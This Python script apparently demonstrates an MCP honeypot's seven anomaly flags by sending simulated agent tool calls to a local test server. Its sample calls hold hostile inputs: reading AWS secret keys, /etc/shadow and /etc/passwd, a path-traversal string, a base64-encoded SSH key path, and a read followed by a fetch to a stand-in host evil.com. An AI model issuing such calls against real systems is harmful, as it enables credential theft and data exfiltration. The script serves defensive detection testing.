#!/usr/bin/env python3
"""Trigger each of the 7 anomaly flags with minimal code.

Each function triggers exactly one flag and explains what causes it.
Run all of them to see every flag in Jaeger/Grafana.

Usage:
    python examples/flag_triggers.py

Requires: docker compose up, pip install httpx
"""

import asyncio
import base64
import json

import httpx

HONEYPOT_URL = "http://localhost:8000"


class Session:
    """Minimal MCP session helper."""

    def __init__(self, client: httpx.AsyncClient, agent_name: str = "FlagTester"):
        self.client = client
        self.agent_name = agent_name
        self._id = 0
        self._responses: dict[int, asyncio.Future[dict]] = {}
        self._endpoint = ""
        self._sse = None
        self._reader = None

    async def connect(self) -> None:
        self._sse = self.client.stream("GET", f"{HONEYPOT_URL}/sse")
        resp = await self._sse.__aenter__()
        async for line in resp.aiter_lines():
            if line.startswith("data: "):
                self._endpoint = HONEYPOT_URL + line[6:]
                break

        async def _read() -> None:
            event_type = ""
            async for line in resp.aiter_lines():
                if line.startswith("event: "):
                    event_type = line[7:]
                elif line.startswith("data: ") and event_type == "message":
                    data = json.loads(line[6:])
                    rid = data.get("id")
                    if rid in self._responses:
                        self._responses[rid].set_result(data)
                    event_type = ""

        self._reader = asyncio.create_task(_read())

    async def initialize(self) -> None:
        resp = await self._call(
            "initialize",
            {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": self.agent_name, "version": "1.0"},
            },
        )
        await self.client.post(
            self._endpoint,
            json={
                "jsonrpc": "2.0",
                "method": "notifications/initialized",
            },
        )
        await asyncio.sleep(0.3)
        return resp

    async def tool(self, name: str, args: dict) -> dict:
        return await self._call("tools/call", {"name": name, "arguments": args})

    async def _call(self, method: str, params: dict) -> dict:
        self._id += 1
        self._responses[self._id] = asyncio.get_event_loop().create_future()
        await self.client.post(
            self._endpoint,
            json={
                "jsonrpc": "2.0",
                "id": self._id,
                "method": method,
                "params": params,
            },
        )
        return await asyncio.wait_for(self._responses[self._id], timeout=10)

    async def close(self) -> None:
        if self._reader:
            self._reader.cancel()
        if self._sse:
            await self._sse.__aexit__(None, None, None)


async def trigger_credential_probe() -> None:
    """Flag: credential_probe — any secrets-category tool call."""
    print("\n1. credential_probe")
    print("   Trigger: call any secrets tool (get_env_var, read_secret, list_secrets, get_api_key)")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "CredentialProber")
        await s.connect()
        await s.initialize()
        await s.tool("get_env_var", {"name": "AWS_SECRET_ACCESS_KEY"})
        await s.close()
    print("   DONE")


async def trigger_path_traversal() -> None:
    """Flag: path_traversal — ../ in any parameter value."""
    print("\n2. path_traversal")
    print("   Trigger: include ../ in a parameter value")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "PathTraverser")
        await s.connect()
        await s.initialize()
        await s.tool("read_file", {"path": "../../../../etc/shadow"})
        await s.close()
    print("   DONE")


async def trigger_param_obfuscation() -> None:
    """Flag: param_obfuscation — base64 param value >20 chars."""
    print("\n3. param_obfuscation")
    print("   Trigger: send a base64-encoded parameter value longer than 20 chars")
    encoded = base64.b64encode(b"/root/.ssh/authorized_keys").decode()  # 36 chars
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "ParamObfuscator")
        await s.connect()
        await s.initialize()
        await s.tool("read_file", {"path": encoded})
        await s.close()
    print(f"   Sent base64: {encoded} (len={len(encoded)})")
    print("   DONE")


async def trigger_rapid_enumeration() -> None:
    """Flag: rapid_enumeration — >10 calls within 5 seconds."""
    print("\n4. rapid_enumeration")
    print("   Trigger: make >10 tool calls in rapid succession (<5s)")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "RapidEnumerator")
        await s.connect()
        await s.initialize()
        for i in range(15):
            await s.tool("list_directory", {"path": f"/dir{i}"})
        await s.close()
    print("   Sent 15 calls rapidly")
    print("   DONE")


async def trigger_replay_attempt() -> None:
    """Flag: replay_attempt — same tool+params hash within 60s."""
    print("\n5. replay_attempt")
    print("   Trigger: call the same tool with identical params twice within 60s")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "Replayer")
        await s.connect()
        await s.initialize()
        await s.tool("read_file", {"path": "/etc/hostname"})
        await asyncio.sleep(0.5)
        await s.tool("read_file", {"path": "/etc/hostname"})  # same call = replay
        await s.close()
    print("   DONE")


async def trigger_exfiltration_chain() -> None:
    """Flag: exfiltration_chain — read tool followed by network tool within 300s."""
    print("\n6. exfiltration_chain")
    print("   Trigger: call a read tool, then a network tool in the same session")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "Exfiltrator")
        await s.connect()
        await s.initialize()
        await s.tool("read_file", {"path": "/etc/passwd"})  # read family
        await asyncio.sleep(0.3)
        await s.tool("fetch_url", {"url": "http://evil.com/exfil"})  # network family
        await s.close()
    print("   DONE")


async def trigger_privilege_escalation() -> None:
    """Flag: privilege_escalation — tool category not previously seen in session."""
    print("\n7. privilege_escalation")
    print("   Trigger: call tools from different categories in the same session")
    async with httpx.AsyncClient(timeout=30) as client:
        s = Session(client, "Escalator")
        await s.connect()
        await s.initialize()
        await s.tool("read_file", {"path": "/tmp/a"})  # filesystem (first category)
        await s.tool("run_command", {"command": "whoami"})  # exec (NEW category -> escalation!)
        await s.tool("get_env_var", {"name": "SECRET_KEY"})  # secrets (NEW -> escalation again!)
        await s.tool("fetch_url", {"url": "http://x.com"})  # web (NEW -> escalation again!)
        await s.close()
    print("   DONE")


async def main() -> None:
    print("=" * 60)
    print("  MCP Honeypot — Anomaly Flag Trigger Examples")
    print("=" * 60)

    await trigger_credential_probe()
    await trigger_path_traversal()
    await trigger_param_obfuscation()
    await trigger_rapid_enumeration()
    await trigger_replay_attempt()
    await trigger_exfiltration_chain()
    await trigger_privilege_escalation()

    print("\n" + "=" * 60)
    print("  All 7 flags triggered!")
    print("  Jaeger:  http://localhost:16686 (service=mcp-honeypot)")
    print("  Grafana: http://localhost:3000/d/anomaly-monitor")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
